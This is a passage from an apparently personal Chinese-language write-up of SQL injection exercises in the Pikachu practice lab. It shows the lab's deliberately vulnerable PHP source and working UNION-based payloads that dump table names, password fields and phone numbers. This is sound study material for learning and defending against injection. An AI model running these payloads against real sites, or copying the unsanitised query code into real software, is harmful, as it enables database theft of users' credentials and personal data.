class="keyword">from</span> information_schema.SCHEMATA;</span><br><span class="line"># TABLES 表（表信息）涵括数据库名（TABLE_SCHEMA），数据表名（TABLE_NAME），表类型（TABLE_TYPE）等字段。</span><br><span class="line"># COLUMNS　表（列信息）涵括　数据库名（TABLE_SCHEMA），数据表名（TABLE_NAME），字段名（COLUMN_NAME）。</span><br><span class="line"># <span class="keyword">LIKE</span> 操作符用于在 <span class="keyword">WHERE</span> 字句中搜索列中的指定模式。</span><br><span class="line"><span class="keyword">select</span> username,id,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%l%&#x27;</span></span><br><span class="line"># 通过通配符（<span class="operator">%</span>）进行模糊搜索，获取username字段中所有含‘l’的值。</span><br><span class="line"># LIMIT 操作符用于限制由 <span class="keyword">SELECT</span> 语句返回的数据数量(记录数)</span><br><span class="line"># 下列语句限制显示<span class="number">5</span>条结果的返回</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">member</span> LIMIT <span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字型：user_id=<span class="variable">$id</span></span><br><span class="line">字符型：user_id=<span class="string">&#x27;$id&#x27;</span></span><br><span class="line">搜索型：text LIKE <span class="string">&#x27;%&#123;$_GET[&#x27;</span>search<span class="string">&#x27;]&#125;%&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 正常参数写入</span><br><span class="line">id=<span class="number">1</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line"># <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 不报错，<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 报错，id为问题参数</span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line"># SQL判断--单引号报错</span><br><span class="line">id=<span class="number">1</span><span class="comment">&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"></span><br><span class="line"># 猜测全语句</span><br><span class="line">select username,email from member where id = $id</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源代码分析，好吧，这里解析挺好的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里没有做任何处理，直接拼到select里面去了,形成Sql注入</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select username,email from member where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="comment">//这里如果用==1,会严格一点</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$username</span>=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;hello,<span class="subst">&#123;$username&#125;</span> </span></span><br><span class="line"><span class="string">your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 其他payload</span><br><span class="line"></span><br><span class="line"># 构造 <span class="keyword">OR</span> 连接，显示所有返回记录</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 猜语句返回的字段数：<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 猜<span class="keyword">member</span>表中存在的字段</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> username<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 结合其他<span class="keyword">SQL</span>语句，查询当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">1</span>#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 根据捕获的数据库名列出其下所有表</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 列出 <span class="keyword">member</span> 表中所有字段</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;member&#x27;</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 不重复列出 <span class="keyword">member</span> 表下 pw 字段的所有记录</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,pw <span class="keyword">from</span> <span class="keyword">member</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 或列出所有电话号码</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,phonenum <span class="keyword">from</span> <span class="keyword">member</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 列出 pikachu 库的 users 表下的所有密码</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> users<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"># 列出 mysql 库的 db 表下的 <span class="keyword">User</span> 字段的所有记录</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">User</span> <span class="keyword">from</span> mysql.db<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br></pre></td></tr></table></figure><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#　正常查询，返回所在记录的id 和 email 字段</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line"># 单引号报错</span><br><span class="line"><span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy<span class="comment">&#x27;&amp;submit=查询</span></span><br><span class="line"></span><br><span class="line"># <span class="comment">&#x27;--+ 正常显示</span></span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy<span class="comment">&#x27;--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"></span><br><span class="line"># 加号正常显示</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy+&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line"># 判断，<span class="keyword">name</span>作为问题参数，具体SQL语句猜测</span><br><span class="line">SELECT id,email FROM member WHERE username = $<span class="keyword">name</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源代码分析</span></span><br><span class="line"><span class="comment"># 输入“&#x27;”搜索，还真提示引号没闭合，得注意点报错</span></span><br><span class="line"><span class="comment"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span></span><br><span class="line"><span class="comment"># 直接用‘--+’给他把后边的给注释吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> </span></span><br><span class="line"><span class="string">your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line"></span><br><span class="line"># 执行当前所有查询操作</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucyname=kobe<span class="comment">&#x27; or 1=1--+&amp;submit=查询</span></span><br><span class="line"></span><br><span class="line"># 获取当前数据库下所有表名</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy<span class="comment">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()--+&amp;submit=查询</span></span><br><span class="line"></span><br><span class="line"># 查询users表中所有字段</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_str.php?<span class="keyword">name</span>=lucy<span class="comment">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;--+&amp;submit=查询</span></span><br><span class="line"></span><br><span class="line"># 都类似 数字型注入(post) 的 payload，回去看看就好了</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有用户名含<span class="comment">&#x27;l&#x27;的记录</span></span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_search.php?<span class="keyword">name</span>=l&amp;submit=%E6%<span class="number">90</span>%<span class="number">9</span>C%E7%B4%A2</span><br><span class="line"></span><br><span class="line"># 单引号依旧报错</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_search.php?<span class="keyword">name</span>=r<span class="comment">&#x27;&amp;submit=%641c%7d22</span></span><br><span class="line"></span><br><span class="line"># 搜索框直接输入 <span class="comment">&#x27; order by 2# 判字段，得查询字段为2个</span></span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_search.php?<span class="keyword">name</span>=%<span class="number">27</span>+order+by+<span class="number">2</span>%<span class="number">23</span>&amp;submit=%E6%<span class="number">90</span>%<span class="number">9</span>C%E7%B4%A2</span><br><span class="line"></span><br><span class="line"># 直接输入搜索框</span><br><span class="line"># 列 users 表字段</span><br><span class="line"><span class="comment">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;#</span></span><br><span class="line"># 列所有password 记录</span><br><span class="line"><span class="comment">&#x27; union select 1,2,password from users#</span></span><br><span class="line"><span class="comment">&#x27; union select 1,2,group_concat(password) from users#</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析源码</span></span><br><span class="line"><span class="comment"># 输入 &#x27; 报错：</span></span><br><span class="line"><span class="comment"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27;&#x27; at line 1</span></span><br><span class="line"><span class="comment"># 构造闭合 &#x27;&#x27;%</span></span><br><span class="line"><span class="comment"># 阿巴阿巴啊吧，插不进语句，直接注释吧</span></span><br><span class="line"><span class="comment"># 嘻嘻，多试试总是好的，闭合成功</span></span><br><span class="line"><span class="comment"># i&#x27; UNION SELECT TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE FROM information_schema.TABLES WHERE TABLE_TYPE LIKE &#x27;%</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里的变量是模糊匹配，需要考虑闭合</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select username,id,email from member where username like &#x27;%<span class="subst">$name</span>%&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//彩蛋:这里还有个xss</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名中含有<span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>的结果如下：</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$uname</span>=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;username：<span class="subst">&#123;$uname&#125;</span></span></span><br><span class="line"><span class="string">uid:<span class="subst">&#123;$id&#125;</span> </span></span><br><span class="line"><span class="string">email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 万能的单引号</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_x.php?<span class="keyword">name</span>=%<span class="number">27</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"># 瞅下报错：</span><br><span class="line"># # You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27;&#x27;)&#x27; at line 1</span></span><br><span class="line"># 小括号这是没闭合？闭合并注释后面，得到构造 <span class="comment">&#x27;)#</span></span><br><span class="line"># 提示：您输入的username不存在，请重新输入！</span><br><span class="line"># 加点数据，构造 <span class="comment">&#x27;) order by 2#</span></span><br><span class="line"># 还是提示：您输入的username不存在，请重新输入！</span><br><span class="line"># 把<span class="number">2</span>改成<span class="number">3</span>，哦豁，字段爆出来了：Unknown column <span class="comment">&#x27;3&#x27; in &#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"><span class="comment"># 比对Navicat中进行的实验。</span></span><br><span class="line"><span class="comment">#　select id,email from member where username=(&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;)&#x27; at line 1</span></span><br><span class="line"><span class="comment"># &gt; 时间: 0s</span></span><br><span class="line"><span class="comment"># 可以看到，&#x27;&#x27;&#x27;&#x27;)&#x27; 可以拆分为 ‘&#x27;&#x27;&#x27;)’，在Navicat中可以明显看到 &#x27;&#x27;&#x27;) 是有问题的，即没闭合造成报错。</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;：指定字符串，无法在其中再使用通配符</span></span><br><span class="line"><span class="comment"># 构造闭合</span></span><br><span class="line"><span class="comment"># lucy&#x27;) UNION SELECT username,pw FROM member WHERE id=(&#x27;2</span></span><br><span class="line"><span class="comment"># 完整语句</span></span><br><span class="line"><span class="comment">#select id,email from member where username=(&#x27;lucy&#x27;) UNION SELECT username,pw FROM member WHERE id=(&#x27;2&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> </span></span><br><span class="line"><span class="string">your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span 